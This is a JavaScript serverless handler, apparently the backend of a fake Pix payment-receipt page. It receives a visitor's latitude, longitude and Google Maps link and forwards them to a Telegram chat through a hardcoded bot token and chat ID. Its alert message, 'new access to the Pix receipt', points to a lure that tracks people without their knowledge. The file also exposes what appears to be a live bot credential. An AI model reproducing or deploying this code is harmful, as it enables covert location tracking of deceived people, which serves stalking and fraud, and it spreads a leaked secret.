export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido' });
  }

  const { latitude, longitude, maps } = req.body;

  const TELEGRAM_BOT_TOKEN = '7964496822:AAFCBrNEI0b0oYQOFimCMobsWi_peVjN0wY';
  const TELEGRAM_CHAT_ID = '6045619916';

  const mensagem = `🚨 *Novo acesso ao Comprovante Pix!*\n\n📍 *Latitude:* ${latitude}\n📍 *Longitude:* ${longitude}\n🗺️ *Google Maps:* ${maps}`;

  try {
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: mensagem,
        parse_mode: 'Markdown'
      })
    });

    const data = await response.json();

    if (data.ok) {
      return res.status(200).json({ success: true });
    } else {
      return res.status(500).json({ error: 'Erro ao enviar para o Telegram', details: data });
    }
  } catch (err) {
    return res.status(500).json({ error: 'Erro interno no servidor', details: err.message });
  }
}
